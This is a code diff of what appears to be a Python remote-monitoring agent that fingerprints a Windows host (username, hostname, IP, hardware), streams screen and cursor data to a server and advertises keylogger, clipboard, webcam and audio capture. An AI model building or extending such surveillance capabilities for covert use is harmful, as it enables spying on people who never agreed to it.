@@ -296,9 +296,10 @@ def _read_token_from_trailer() -> str:
 # ════════════════════════════════════════════════════════════════════════════
 CONFIG = {
     # ── Connection ──────────────────────────────────────────────────────────
-    # For Local LAN testing: Use http://YOUR_PC_IP:10000
+    # For Local LAN testing: Use http://YOUR_PC_IP:10000 (e.g., http://192.168.100.25:10000)
     # For Render live: Use https://your-app.onrender.com
-    "SERVER_URL":           "http://localhost:10000",
+    # OR: Create an agent_config.txt file next to the EXE with SERVER_URL=http://your.server:port
+    "SERVER_URL":           "http://192.168.100.25:10000",
     "DEVICE_TOKEN":         "TEST-AGENT",
 
     # ── Identity ────────────────────────────────────────────────────────────
@@ -366,6 +367,52 @@ CONFIG = {
     "SERVER_CAPS":          {},
     "SERVER_VERSION":       "unknown",
 }
+
+# ── Load config from file (if exists) ──────────────────────────────────────
+# v16: Load server URL and settings from 'agent_config.txt' next to the EXE
+def _load_config_from_file():
+    """Load configuration from agent_config.txt if present."""
+    try:
+        import json
+        import sys
+        from pathlib import Path
+        
+        # Get directory of current executable/script
+        if getattr(sys, "frozen", False):
+            exe_dir = Path(sys.executable).parent
+        else:
+            exe_dir = Path(__file__).parent
+        
+        config_file = exe_dir / "agent_config.txt"
+        if config_file.exists():
+            print(f"Loading config from: {config_file}")
+            with open(config_file, "r", encoding="utf-8") as f:
+                for line in f:
+                    line = line.strip()
+                    if line and not line.startswith("#") and "=" in line:
+                        key, value = line.split("=", 1)
+                        key = key.strip()
+                        value = value.strip()
+                        if key in CONFIG:
+                            # Handle boolean values
+                            if value.lower() in ("true", "yes", "1"):
+                                CONFIG[key] = True
+                            elif value.lower() in ("false", "no", "0"):
+                                CONFIG[key] = False
+                            # Handle numeric values
+                            elif value.replace(".", "", 1).isdigit():
+                                if "." in value:
+                                    CONFIG[key] = float(value)
+                                else:
+                                    CONFIG[key] = int(value)
+                            else:
+                                CONFIG[key] = value
+            print(f"Loaded config: SERVER_URL={CONFIG['SERVER_URL']}")
+    except Exception as e:
+        print(f"Warning: Could not load config file: {e}")
+
+# Load config file before anything else
+_load_config_from_file()
 
 # ── Auto-registration: each machine gets a unique ID from its hardware ──────
 # No token needed by the end user. The SHARED_TOKEN authenticates this agent
@@ -477,42 +524,51 @@ def get_device_id() -> str:
 
 
 def get_device_fingerprint() -> dict:
-    """ v16: Ultra-fast fingerprinting for immediate connection. """
+    """ v16: Ultra-fast fingerprinting with real LAN IP discovery. """
     try:
-        local_ip = "127.0.0.1" # Fast local-only for debug, change if needed
+        # v16: Robust LAN IP discovery instead of hardcoded 127.0.0.1
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        local_ip = s.getsockname()[0]
+        s.close()
     except Exception:
-        local_ip = "unknown"
+        try:
+            local_ip = socket.gethostbyname(socket.gethostname())
+        except Exception:
+            local_ip = "127.0.0.1"
 
     did   = CONFIG["DEVICE_TOKEN"]
-    # v16: Hardcoded or cached resolution for speed during debug
-    sw, sh = 1920, 1080 
+    # v16: Use real hostname if available, fallback to LOCAL-DEBUG
+    hostname = platform.node() or "EXTERNAL-LAPTOP"
+    
+    sw, sh = _get_monitor_resolution(1)
     
     fp = {
         "device_id":       did,
         "token":           did,
         "hardware_id":     did,
-        "hostname":        "LOCAL-DEBUG",
-        "username":        "DEBUG-USER",
-        "os":              "Windows 10",
-        "os_version":      "10.0.0",
-        "machine":         "AMD64",
-        "processor":       "AMD64",
+        "hostname":        hostname,
+        "username":        os.getlogin() if os.name == 'nt' else "USER",
+        "os":              f"{platform.system()} {platform.release()}",
+        "os_version":      platform.version(),
+        "machine":         platform.machine(),
+        "processor":       platform.processor(),
         "local_ip":        local_ip,
         "agent_version":   CONFIG["AGENT_VERSION"],
         "stream_mode":     CONFIG["STREAM_MODE"],
         "timestamp":       datetime.utcnow().isoformat(),
-        "screen_count":    1,
+        "screen_count":    _get_screen_count(),
         "screen_w":        sw,
         "screen_h":        sh,
-        "cpu_count":       4,
-        "ram_total_gb":    16,
+        "cpu_count":       os.cpu_count() or 4,
+        "ram_total_gb":    round(psutil.virtual_memory().total / (1024**3), 1),
         "features": {
-            "keylogger":  False,
-            "clipboard":  False,
-            "webcam":     False,
-            "audio":      False,
-            "registry":   False,
-            "services":   False,
+            "keylogger":  CONFIG["ENABLE_KEYLOGGER"],
+            "clipboard":  CONFIG["ENABLE_CLIPBOARD"],
+            "webcam":     True,
+            "audio":      True,
+            "registry":   True,
+            "services":   True,
         }
     }
     return fp
@@ -592,13 +648,18 @@ def _to_monitor_absolute(x, y, monitor_idx: int | None = None, w: int | None = N
 
 def _cursor_relative_to_monitor(monitor_idx: int | None = None):
     """Return cursor position relative to the selected monitor, or None if outside it."""
-    if not PYAUTOGUI_OK:
-        return None
     mon = _get_monitor_geometry(monitor_idx or CONFIG["STREAM_MONITOR"])
     try:
-        x, y = pyautogui.position()
+        # v16: Prefer win32api for physical pixel coordinates (more accurate than pyautogui)
+        try:
+            import win32api
+            x, y = win32api.GetCursorPos()
+        except Exception:
+            if not PYAUTOGUI_OK: return None
+            x, y = pyautogui.position()
     except Exception:
         return None
+    
     rx, ry = int(x) - mon["left"], int(y) - mon["top"]
     if rx < -50 or ry < -50 or rx >= mon["width"]+50 or ry >= mon["height"]+50:
         return None
@@ -1210,7 +1271,7 @@ async def _adv_task_stream_frames(unified_sio=None):
     Waits for auth_ok via asyncio.Event — NO polling loop over _adv_authed flag.
     Spawns producer + ticker threads, then drains the queue and emits frames.
     """
-    global _adv_last_frame_pkt, _adv_last_frame_ts, _adv_sio_async, _adv_task_running, _adv_stream_ctrl, _consumer_frame_count
+    global _adv_last_frame_pkt, _adv_last_frame_ts, _adv_sio_async, _adv_task_running, _adv_stream_ctrl, _consumer_frame_count, _adv_viewers
     if _adv_task_running:
         log.info("Stream consumer already running — skipping")
         return
@@ -1299,8 +1360,8 @@ async def _adv_task_stream_frames(unified_sio=None):
                     frame_ts_us = int.from_bytes(pkt[8:16], "big")
                     now_us = int(time.time() * 1_000_000)
                     age_ms = (now_us - frame_ts_us) / 1000.0
-                    # v16: Increased stale-frame guard for local debug stability
-                    if age_ms > 500:
+                    # v16: Aggressive stale-frame guard for low-lag performance
+                    if age_ms > 150:
                         if _consumer_frame_count % 60 == 0:
                             log.warning(f"Stream consumer: dropping stale frame locally (age={age_ms:.1f}ms)")
                         continue
@@ -1383,13 +1444,21 @@ async def _adv_task_stream_cursor():
                 x, y = pos
                 dx, dy = abs(x - lx), abs(y - ly)
                 if dx > 1 or dy > 1 or skip >= 120:
+                    # v16: Send normalized cursor coordinates (0.0 to 1.0) for perfect scaling
+                    mon = _get_monitor_geometry(CONFIG["STREAM_MONITOR"])
+                    # Use 0..65535 (16-bit) for high precision normalized coords
+                    nx = int((x / mon["width"]) * 65535) if mon["width"] > 0 else 0
+                    ny = int((y / mon["height"]) * 65535) if mon["height"] > 0 else 0
+                    
                     ts  = int(time.time() * 1000) & 0xFFFFFFFF
-                    pkt = CURSOR_HDR.pack(x, y, ts)
+                    # We'll use a new header for normalized cursor: ">HHI" (2 bytes X, 2 bytes Y, 4 bytes TS)
+                    pkt = struct.pack(">HHI", nx, ny, ts)
                     
                     # v15: Use the most stable available socket for cursor
                     target_sio = _adv_sio_async if (_adv_sio_async and _adv_sio_async.connected) else None
                     if target_sio:
-                        asyncio.create_task(_safe_emit("cursor_bin", pkt))
+                        # v16: Mark as normalized cursor event
+                        asyncio.create_task(_safe_emit("cursor_bin_norm", pkt))
                     
                     lx, ly = x, y
                     skip = 0
@@ -5108,6 +5177,16 @@ def _global_exception_handler(exc_type, exc_val, exc_tb):
 
 
 if __name__ == "__main__":
+    # v16: Set process DPI awareness for accurate coordinate mapping
+    try:
+        import ctypes
+        ctypes.windll.shcore.SetProcessDpiAwareness(1) # PROCESS_SYSTEM_DPI_AWARE
+    except Exception:
+        try:
+            ctypes.windll.user32.SetProcessDPIAware()
+        except Exception:
+            pass
+
     # Install global crash handler
     sys.excepthook = _global_exception_handler
 
